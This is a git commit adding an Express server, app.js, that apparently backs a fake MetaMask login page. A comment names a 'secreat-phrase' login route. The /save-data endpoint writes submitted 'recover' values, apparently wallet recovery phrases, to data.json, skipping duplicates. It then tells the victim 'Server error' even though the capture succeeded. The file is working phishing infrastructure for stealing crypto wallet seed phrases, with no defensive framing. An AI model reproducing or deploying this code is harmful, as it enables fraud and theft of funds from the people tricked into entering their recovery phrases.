fdd4aaf779abbb1519fa477d80885a004ebd7c0c
Adi9910 <114596621+Adi9910@users.noreply.github.com>
2025-02-22 21:22:37 +0530

    Add files via upload

---
+++ app.js
@@ -0,0 +1,49 @@
+const express = require("express");
+const fs = require("fs");
+const path = require("path");
+const app = express();
+const PORT = 3000;
+
+// http://localhost:3000/metamask-login?type=secreat-phrase
+
+// Middleware to parse JSON bodies
+app.use(express.json());
+
+// Endpoint to save data
+app.post("/save-data", (req, res) => {
+  const newData = req.body; // Get the data from the request body
+
+  // Read the existing data from data.json
+  const filePath = path.join(__dirname, "data.json");
+  fs.readFile(filePath, "utf8", (err, data) => {
+    if (err) {
+      console.error("Error reading file:", err);
+      return res.status(500).send("Error reading file");
+    }
+
+    const jsonData = JSON.parse(data);
+    if (!jsonData.find((item) => item.recover === newData.recover)) {
+      jsonData.push(newData); // Add the new data to the array
+    }
+    // Write the updated data back to data.json
+    fs.writeFile(filePath, JSON.stringify(jsonData, null, 2), (err) => {
+      if (err) {
+        console.error("Error writing file:", err);
+        return res.status(500).send("Error writing file");
+      }
+      res.status(200).send("Server error");
+    });
+  });
+});
+
+// Serve the React app
+app.use(express.static(path.join(__dirname, "dist")));
+
+// Handle React routing
+app.get("*", (req, res) => {
+  res.sendFile(path.join(__dirname, "dist", "index.html"));
+});
+
+app.listen(PORT, "0.0.0.0", () => {
+  console.log(`Server is running on http://localhost:${PORT}`);
+});
